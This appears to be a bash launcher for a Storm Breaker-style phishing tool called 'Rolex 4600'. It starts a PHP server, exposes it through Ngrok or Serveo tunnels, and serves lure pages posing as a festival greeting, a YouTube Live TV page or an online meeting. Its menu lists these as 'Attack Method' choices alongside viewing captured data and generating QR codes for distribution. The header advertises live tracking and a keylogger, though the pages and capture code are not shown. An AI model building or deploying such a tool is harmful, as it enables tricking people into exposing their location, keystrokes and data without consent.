#!/bin/bash
# Rolex 4600 - Advanced Security Tool (Storm Breaker Style)
# Features: Ngrok/Serveo Selection, Multi-Page Phishing, Live Tracking, Keylogger, QR Code, GUI Dashboard

trap cleanup EXIT

banner() {
clear 
echo -e "\e[1;94m   ██████████               ███████            ████            ████████████        ██            ██        "
echo -e "\e[1;94m   ████     ████         ████     ████         ████            ████                  ██        ██           "
echo -e "\e[1;94m   ████     ████        ████        ████       ████            ████                    ██    ██             "
echo -e "\e[1;94m   ████     ████       ████          ████      ████            ███████████              ██  ██              "
echo -e "\e[1;94m   ████     ████      ████            ████     ████            ████                       ██                "
echo -e "\e[1;94m   ██████████          ████          ████      ████            ████                     ██  ██              "
echo -e "\e[1;94m   ████   ████          ████        ████       ████            ████                   ██      ██            "
echo -e "\e[1;94m   ████     ████          ████    ████         ████            ████                 ██          ██          "
echo -e "\e[1;94m   ████        ████          ██████           ███████████      ████████████      ██                 ██        "
echo -e "\e[1;94m ╚════════════════════╝╚══════════════════╝╚═══════════════╝╚═════════════════╝╚══════════════════════════════╝                         "
echo -e "\e[1;93m────────────────────────────────────────────\e[0m"
echo -e "\e[1;93m      ROLEX 4600 🦂 - Advanced Security Tool   \e[0m"
echo -e "\e[1;93m────────────────────────────────────────────\e[0m"
echo -e "\e[1;94m   Ethical Hacking | Penetration Testing   \e[0m"
echo -e "\e[1;94m   Exploit Development | Security Research  \e[0m"
echo -e "\n"
}

dependencies() {
    command -v php > /dev/null 2>&1 || { echo "PHP not installed. Aborting."; exit 1; }
    command -v curl > /dev/null 2>&1 || { echo "Curl not installed. Aborting."; exit 1; }
    command -v qrencode > /dev/null 2>&1 || { echo "Installing QR Code Generator..."; apt install qrencode -y; }
    command -v jq > /dev/null 2>&1 || { echo "Installing jq..."; apt install jq -y; }
}

choose_tunnel() {
    echo -e "\nSelect a Tunnel Method:\n"
    echo "1) Ngrok"
    echo "2) Serveo.io"
    read -p "Enter your choice: " tunnel_choice
    case $tunnel_choice in
        1) setup_ngrok ;;
        2) setup_serveo ;;
        *) echo "Invalid choice!"; choose_tunnel ;;
    esac
}

menu() {
    while true; do
        echo -e "\nSelect an Attack Method:\n"
        echo "1) Festival Greeting Page"
        echo "2) YouTube Live TV"
        echo "3) Online Meeting"
        echo "4) Custom Link"
        echo "5) View Captured Data"
        echo "6) Generate QR Code"
        echo "7) Exit"
        read -p "Enter your choice: " attack_choice

        case $attack_choice in
            1) generate_link "festivalwishes.html" ;;
            2) generate_link "LiveYTTV.html" ;;
            3) generate_link "OnlineMeeting.html" ;;
            4) read -p "Enter your custom link: " custom_link; generate_custom_link "$custom_link" ;;
            5) view_logs ;;
            6) generate_qr_code ;;
            7) exit 0 ;;
            *) echo "Invalid choice! Try again." ;;
        esac
    done
}

setup_ngrok() {
    echo "Starting ngrok..."
    ./ngrok http 8080 > /dev/null 2>&1 &
    sleep 5
    link=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r '.tunnels[0].public_url')
    echo "Ngrok Link: $link"
}

setup_serveo() {
    echo "Starting Serveo.io..."
    ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 serveo.net > /dev/null 2>&1 &
    sleep 5
    echo "Serveo.io is running!"
}

generate_link() {
    selected_page="$1"
    if [[ ! -f "$selected_page" ]]; then
        echo "Error: File '$selected_page' not found!"
        return
    fi
    cp "$selected_page" index.html
    start_server
    choose_tunnel
}

generate_qr_code() {
    command -v qrencode >/dev/null 2>&1 || { echo "qrencode is not installed!"; return; }
    read -p "Enter the link to generate QR Code: " qr_link
    qrencode -o qrcode.png "$qr_link"
    echo "QR Code saved as qrcode.png"
}

start_server() {
    echo "Starting PHP Server..."
    php -S 127.0.0.1:8080 > /dev/null 2>&1 &
    sleep 2
    echo "Server started at: http://127.0.0.1:8080"
}

cleanup() {
    echo "Stopping servers..."
    pkill -f "php -S"
    pkill -f "ngrok"
}

banner
dependencies
menu
